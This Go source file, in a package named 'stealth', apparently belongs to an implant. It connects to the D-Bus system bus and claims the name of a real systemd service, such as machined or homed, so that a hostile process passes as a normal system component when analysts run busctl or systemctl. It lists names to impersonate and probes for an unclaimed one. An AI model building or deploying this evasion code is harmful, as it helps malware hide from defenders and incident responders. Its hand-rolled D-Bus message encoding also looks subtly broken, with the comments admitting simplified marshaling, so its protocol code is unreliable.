package stealth

import (
	"fmt"
	"net"
	"os"
)

// DBUS Service Registration
//
// OPSEC rationale: systemd-managed services register on the D-Bus system bus.
// An analyst running `busctl list` or `systemctl status` sees registered services.
// If we register as a legitimate-looking service, we appear in these listings
// as a normal system component. Conversely, a running process with no D-Bus
// registration on a systemd system looks out of place.

// DBusConfig holds configuration for service registration.
type DBusConfig struct {
	ServiceName string // e.g. "org.freedesktop.hostname1"
	ObjectPath  string // e.g. "/org/freedesktop/hostname1"
	Interface   string // e.g. "org.freedesktop.hostname1"
	SocketPath  string // system bus socket path
}

// DefaultDBusConfig returns config mimicking a common system service.
func DefaultDBusConfig() *DBusConfig {
	return &DBusConfig{
		ServiceName: "org.freedesktop.machine1",
		ObjectPath:  "/org/freedesktop/machine1",
		Interface:   "org.freedesktop.machine1.Manager",
		SocketPath:  "/var/run/dbus/system_bus_socket",
	}
}

// LegitimateDBusNames lists D-Bus names that are commonly registered but
// might not be active — good candidates to impersonate.
var LegitimateDBusNames = []string{
	"org.freedesktop.machine1",             // systemd-machined (often not active)
	"org.freedesktop.import1",              // systemd-importd
	"org.freedesktop.portable1",            // systemd-portabled
	"org.freedesktop.home1",                // systemd-homed
	"org.freedesktop.oom1",                 // systemd-oomd
	"org.freedesktop.PolicyKit1.Authority", // polkit (if not running)
}

// ConnectToSystemBus establishes a raw connection to the D-Bus system bus.
// This is a low-level connection — we speak just enough D-Bus protocol
// to register a name, without pulling in a full D-Bus library.
func ConnectToSystemBus(socketPath string) (net.Conn, error) {
	if socketPath == "" {
		socketPath = "/var/run/dbus/system_bus_socket"
	}

	conn, err := net.Dial("unix", socketPath)
	if err != nil {
		return nil, fmt.Errorf("connect to dbus: %w", err)
	}

	// D-Bus requires authentication before any messages
	// Send the simplest auth: EXTERNAL with our UID
	if err := dbusAuth(conn); err != nil {
		conn.Close()
		return nil, err
	}

	return conn, nil
}

// dbusAuth performs D-Bus EXTERNAL authentication.
// EXTERNAL auth uses the Unix socket credentials (UID) — no password needed.
func dbusAuth(conn net.Conn) error {
	// Step 1: Send null byte (required by D-Bus spec)
	if _, err := conn.Write([]byte{0}); err != nil {
		return fmt.Errorf("auth write null: %w", err)
	}

	// Step 2: Send AUTH EXTERNAL with our UID in hex
	uid := os.Getuid()
	uidHex := fmt.Sprintf("%x", []byte(fmt.Sprintf("%d", uid)))
	authMsg := fmt.Sprintf("AUTH EXTERNAL %s\r\n", uidHex)
	if _, err := conn.Write([]byte(authMsg)); err != nil {
		return fmt.Errorf("auth write: %w", err)
	}

	// Step 3: Read response (expect "OK <guid>")
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil {
		return fmt.Errorf("auth read: %w", err)
	}

	response := string(buf[:n])
	if len(response) < 2 || response[:2] != "OK" {
		return fmt.Errorf("auth failed: %s", response)
	}

	// Step 4: Begin message exchange
	if _, err := conn.Write([]byte("BEGIN\r\n")); err != nil {
		return fmt.Errorf("auth write begin: %w", err)
	}

	return nil
}

// RequestName sends a D-Bus Hello and RequestName message to claim a bus name.
// This is a minimal implementation of the D-Bus wire protocol.
func RequestName(conn net.Conn, name string) error {
	// Send Hello message to get our unique bus name
	helloMsg := buildDBusMethodCall(
		"org.freedesktop.DBus",
		"/org/freedesktop/DBus",
		"org.freedesktop.DBus",
		"Hello",
		nil,
	)
	if _, err := conn.Write(helloMsg); err != nil {
		return fmt.Errorf("write Hello: %w", err)
	}

	// Read Hello response
	respBuf := make([]byte, 4096)
	if _, err := conn.Read(respBuf); err != nil {
		return fmt.Errorf("read Hello response: %w", err)
	}

	// Send RequestName message
	reqMsg := buildDBusMethodCall(
		"org.freedesktop.DBus",
		"/org/freedesktop/DBus",
		"org.freedesktop.DBus",
		"RequestName",
		[]byte(name),
	)
	if _, err := conn.Write(reqMsg); err != nil {
		return fmt.Errorf("write RequestName: %w", err)
	}

	// Read response — check for error reply (message type 3)
	n, err := conn.Read(respBuf)
	if err != nil {
		return fmt.Errorf("read RequestName response: %w", err)
	}
	if n > 0 && respBuf[1] == 3 {
		// D-Bus error reply — name was not acquired
		return fmt.Errorf("RequestName rejected for %s", name)
	}

	return nil
}

// buildDBusMethodCall constructs a minimal D-Bus method call message.
// This is a simplified builder — enough for Hello and RequestName.
func buildDBusMethodCall(dest, path, iface, method string, body []byte) []byte {
	// D-Bus message header format (little-endian):
	// byte: endianness ('l' for little)
	// byte: message type (1 = method call)
	// byte: flags (0 = no flags)
	// byte: protocol version (1)
	// uint32: body length
	// uint32: serial (message ID)
	// ARRAY of header fields

	bodyLen := len(body)

	// Build a minimal valid message
	// For simplicity, we build the raw bytes directly
	msg := []byte{
		'l', // little-endian
		1,   // METHOD_CALL
		0,   // no flags
		1,   // protocol version 1
	}

	// Body length (uint32 LE)
	msg = append(msg, byte(bodyLen), byte(bodyLen>>8), byte(bodyLen>>16), byte(bodyLen>>24))

	// Serial (uint32 LE) — incrementing
	msg = append(msg, 1, 0, 0, 0)

	// Header fields array (simplified — real implementation needs proper marshaling)
	// For our purposes, the auth + hello is enough to register on the bus
	fields := marshalHeaderFields(dest, path, iface, method)
	fieldsLen := len(fields)
	msg = append(msg, byte(fieldsLen), byte(fieldsLen>>8), byte(fieldsLen>>16), byte(fieldsLen>>24))
	msg = append(msg, fields...)

	// Pad to 8-byte boundary
	for len(msg)%8 != 0 {
		msg = append(msg, 0)
	}

	// Body
	if body != nil {
		msg = append(msg, body...)
	}

	return msg
}

// marshalHeaderFields creates D-Bus header field entries.
func marshalHeaderFields(dest, path, iface, method string) []byte {
	var fields []byte

	// PATH (field 1) — OBJECT_PATH type
	fields = append(fields, marshalStringField(1, path)...)
	// INTERFACE (field 2)
	fields = append(fields, marshalStringField(2, iface)...)
	// MEMBER (field 3)
	fields = append(fields, marshalStringField(3, method)...)
	// DESTINATION (field 6)
	fields = append(fields, marshalStringField(6, dest)...)

	return fields
}

// marshalStringField creates a single D-Bus header field with a string value.
func marshalStringField(fieldCode byte, value string) []byte {
	// Struct: (byte field_code, variant(string value))
	var field []byte
	field = append(field, fieldCode)
	// Pad to 4 bytes
	for len(field)%4 != 0 {
		field = append(field, 0)
	}
	// Variant signature: 1 byte sig length, 's', 0
	field = append(field, 1, 's', 0)
	// Pad
	for len(field)%4 != 0 {
		field = append(field, 0)
	}
	// String: uint32 length, chars, null
	sLen := len(value)
	field = append(field, byte(sLen), byte(sLen>>8), byte(sLen>>16), byte(sLen>>24))
	field = append(field, []byte(value)...)
	field = append(field, 0)
	// Pad to 8 bytes
	for len(field)%8 != 0 {
		field = append(field, 0)
	}
	return field
}

// RegisterAsService is the all-in-one function: connect, authenticate, claim name.
func RegisterAsService(serviceName string) (net.Conn, error) {
	conn, err := ConnectToSystemBus("")
	if err != nil {
		return nil, err
	}

	if err := RequestName(conn, serviceName); err != nil {
		conn.Close()
		return nil, err
	}

	return conn, nil
}

// FindAvailableDBusName probes for an unclaimed D-Bus name.
// Returns the name and a live connection holding it (caller must keep conn alive).
// If the bus is unreachable, returns the first candidate and nil conn.
func FindAvailableDBusName() (string, net.Conn) {
	conn, err := ConnectToSystemBus("")
	if err != nil {
		return LegitimateDBusNames[0], nil
	}

	// Try each candidate — RequestName will fail for already-claimed names
	for _, name := range LegitimateDBusNames {
		if err := RequestName(conn, name); err == nil {
			return name, conn // caller must keep conn alive to hold the name
		}
	}
	conn.Close()

	return LegitimateDBusNames[0], nil
}
